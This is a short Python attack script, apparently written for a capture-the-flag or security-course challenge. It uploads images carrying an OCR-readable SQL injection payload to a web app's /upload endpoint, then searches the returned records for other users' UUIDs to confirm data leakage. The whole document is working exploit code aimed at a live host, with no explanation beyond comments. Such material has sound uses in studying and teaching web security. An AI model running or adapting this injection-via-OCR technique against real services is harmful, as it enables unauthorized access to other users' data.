# upload_payload.py — upload the painted SQLi payload via OCR and check for injection.
import requests, json, re
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

for label, f in [("ocr_mix","ocr_mix_datauri.txt"), ("ocr_payload","ocr_payload_datauri.txt")]:
    uri = open(f).read().strip()
    r = requests.post(f"{BASE}/upload", json={"image": uri, "description": label, "user_id": UID})
    print(f"upload {label:12} -> {r.status_code} {r.text[:60].strip()}")

data = requests.get(f"{BASE}/images/{UID}").json()
print("\n--- summary_ocr per test ---")
for img in data:
    if img.get("description") in ("ocr_mix","ocr_payload"):
        print(f"{img['description']:12} id={img['id']:3} summary_ocr={img.get('summary_ocr')!r}")

print("\n--- foreign UUID leaked anywhere (make/model/datetime/summary_ocr) ---")
for img in data:
    for field in ("make","model","datetime","summary_ocr"):
        v = str(img.get(field,""))
        for m in re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", v):
            if m != UID:
                print(f"  LEAKED in {field} of id={img['id']}: {m}")
